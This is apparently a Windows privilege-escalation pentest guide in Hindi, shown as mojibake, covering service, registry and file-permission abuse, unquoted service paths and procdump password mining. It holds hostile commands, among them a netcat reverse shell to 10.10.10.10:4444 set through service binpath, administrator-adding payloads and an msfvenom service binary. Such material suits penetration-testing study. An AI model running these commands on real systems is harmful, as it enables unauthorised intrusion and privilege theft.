рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдЪрд▓ рд░рд╣реЗ рдХрд┐рд╕реА рдмрд╛рдЗрдирд░реА рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдмрд╛рдЗрдирд░реА рдлрд╝реЛрд▓реНрдбрд░ рдХреА рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд [**DLL Hijacking рд╣рдорд▓реЛрдВ**](dll-hijacking.md) рдХрд╛ рд╢реЛрдзрд╛рд░реНрде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
рд╣рдореЗрд╢рд╛ рд╕рдВрднрд╛рд╡рд┐рдд [**electron/cef/chromium debuggers** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдпрд╣рд╛рдВ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)ред

**рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЗ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ (DLL Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### рдореЗрдореЛрд░реА рдкрд╛рд╕рд╡рд░реНрдб рдорд╛рдЗрдирд┐рдВрдЧ

рдЖрдк **рд╕рд┐рд╕рдЗрдВрдЯрд░рдирд▓реНрд╕** рдХреЗ **рдкреНрд░реЛрд╕реАрдбрдВрдк** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдбрдВрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред FTP рдЬреИрд╕реА рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ **рдореЗрдореЛрд░реА рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рд╣реЛрддрд╛ рд╣реИ, рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### рдЕрд╕реБрд░рдХреНрд╖рд┐рдд GUI рдРрдкреНрд╕

**рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдРрдкреНрд╕ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ CMD рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред**

рдЙрджрд╛рд╣рд░рдг: "Windows Help and Support" (Windows + F1), "command prompt" рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ, "Click to open Command Prompt" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ

## рд╕реЗрд╡рд╛рдПрдВ

рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```
net start
wmic service list brief
sc query
Get-Service
```
### рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЖрдк **sc** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
sc qc <service_name>
```
рдпрд╣ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реНрддрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _Sysinternals_ рд╕реЗ рдмрд╛рдЗрдирд░реА **accesschk** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
рдпрд╣ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ "рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛" рдХреНрдпрд╛ рдХрд┐рд╕реА рднреА рд╕реЗрд╡рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[рдЖрдк рдпрд╣рд╛рдВ рд╕реЗ XP рдХреЗ рд▓рд┐рдП accesschk.exe рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### рд╕реЗрд╡рд╛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╣ рддреНрд░реБрдЯрд┐ рд╣реЛ рд░рд╣реА рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП SSDPSRV рдХреЗ рд╕рд╛рде):

_рд╕рд┐рд╕реНрдЯрдо рддреНрд░реБрдЯрд┐ 1058 рд╣реБрдИ рд╣реИ._\
_рд╕реЗрд╡рд╛ рд╢реБрд░реВ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдпрд╛ рддреЛ рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХреЛрдИ рд╕рдХреНрд╖рдо рдЙрдкрдХрд░рдг рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рдирд╣реАрдВ рд╣реИ._

рдЖрдк рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕реЗрд╡рд╛ upnphost SSDPSRV рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рддрд╛рдХрд┐ рдХрд╛рдо рдХрд░ рд╕рдХреЗ (XP SP1 рдХреЗ рд▓рд┐рдП)**

**рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдПрдХ рдФрд░ рдЙрдкрд╛рдп** рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдирд╛:
```
sc.exe config usosvc start= auto
```
### **рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдкрде рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**

рдпрджрд┐ рд╕рдореВрд╣ "рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛" рдореЗрдВ рд╕реЗрд╡рд╛ рдореЗрдВ **SERVICE\_ALL\_ACCESS** рд╣реИ, рддреЛ рд╡рд╣ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ **nc** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### рд╕реЗрд╡рд╛ рдкреБрдирдГ рдЪрд╛рд▓реВ рдХрд░реЗрдВ

To restart a service in Windows, you can use the following steps:

1. Open the Command Prompt as an administrator. (Right-click on the Start button and select "Command Prompt (Admin)" or search for "cmd" in the Start menu, right-click on "Command Prompt" and select "Run as administrator".)

2. Use the `sc` command followed by the service name to stop the service. For example, to stop the "MyService" service, run the following command:
   ```
   sc stop MyService
   ```

3. Wait for the service to stop. You can check the status of the service by running the following command:
   ```
   sc query MyService
   ```

4. Once the service has stopped, use the `sc` command again to start the service. For example, to start the "MyService" service, run the following command:
   ```
   sc start MyService
   ```

5. Verify that the service has started successfully by running the following command:
   ```
   sc query MyService
   ```

By following these steps, you can restart a service in Windows and ensure that any changes or updates to the service take effect.
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
рдЕрдиреНрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:\
**SERVICE\_CHANGE\_CONFIG** рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ\
**WRITE\_DAC:** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ SERVICE\_CHANGE\_CONFIG рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ\
**WRITE\_OWNER:** рдорд╛рд▓рд┐рдХ рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреБрдирд░реНрд╡рд┐рдиреНрдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIG рдХреЛ рдЕрдиреБрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIG рдХреЛ рдЕрдиреБрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ

**рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд╢реЛрдзрди рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк _exploit/windows/local/service\_permissions_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

### рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдХрдордЬреЛрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдмрд╛рдЗрдирд░реА рд╕реНрдерд┐рдд рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ ([**DLL Hijacking**](dll-hijacking.md))**.**\
рдЖрдк **wmic** (system32 рдореЗрдВ рдирд╣реАрдВ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╣рд░ рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **icacls** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
рдЖрдк рднреА **sc** рдФрд░ **icacls** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### рд╕реЗрд╡рд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕рдВрд╢реЛрдзрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдПрдХ рд╕реЗрд╡рд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрд░ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдпрд╛ **NT AUTHORITY\INTERACTIVE** рдореЗрдВ FullControl рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдХрд╛ рдкрде рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### рд╕реЗрд╡рд╛рдУрдВ рд░рдЬрд┐рд╕реНрдЯреНрд░реА AppendData/AddSubdirectory рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрд░ рдпрд╣ рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рдЖрдк рдЗрд╕рд╕реЗ рдЙрдк-рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рд╡рд┐рдВрдбреЛрдЬ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **рдХрд┐рд╕реА рднреА рдЕрд╡рдЪреЗрддрди рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### рдЕрдирдХреЛрдЯреЗрдб рд╕реЗрд╡рд╛ рдкрде

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЗ рдкрде рдореЗрдВ рдХреЛрдИ рдЙрджреНрдзрд░рдг рдирд╣реАрдВ рд╣реИ, рддреЛ рд╡рд┐рдВрдбреЛрдЬ рд╣рд░ рд╕реНрдкреЗрд╕ рд╕реЗ рдкрд╣рд▓реЗ рд╕рднреА рдЕрдВрдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкрде _C:\Program Files\Some Folder\Service.exe_ рдХреЗ рд▓рд┐рдП рд╡рд┐рдВрдбреЛрдЬ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
рдЕрди-рдХреЛрдЯ рдХреА рдЧрдИ рд╕рднреА рд╕реЗрд╡рд╛ рдкрдереЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП (рдмрд┐рд▓реНрдЯ-рдЗрди Windows рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЫреЛрдбрд╝рдХрд░)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**рдЖрдк рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ рдХреЗ рд╕рд╛рде: _exploit/windows/local/trusted\_service\_path_\
рдЖрдк рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ рдХреЗ рд╕рд╛рде рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдПрдХ рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЙрдкрд╛рдп

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╡рд┐рдВрдбреЛрдЬ рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЬрдм рдПрдХ рд╕реЗрд╡рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓рддрд╛ рд╣реЛрддреА рд╣реИ рддреЛ рд╡рд╣ рдХреНрдпрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдЙрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдпрд╣ рдмрд╛рдЗрдирд░реА рдУрд╡рд░рд░рд╛рдЗрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╡рд░реНрдзрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

## рдЕрдиреБрдкреНрд░рдпреЛрдЧ

### рд╕реНрдерд╛рдкрд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ

**рдмрд╛рдЗрдирд░реА рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рд╢рд╛рдпрдж рдЖрдк рдПрдХ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд░реНрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ) рдФрд░ **рдлрд╝реЛрд▓реНрдбрд░реЛрдВ** рдХреА ([DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ](dll-hijacking.md))ред
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд╕рдХреЗрдВ рдпрд╛ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдРрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдЦрд╛рддреЗ (schedtasks) рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рд╕реА рдмрд╛рдЗрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдордЬреЛрд░ рдлрд╝реЛрд▓реНрдбрд░ / рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдкрд░ рдЪрд▓рд╛рдПрдВ

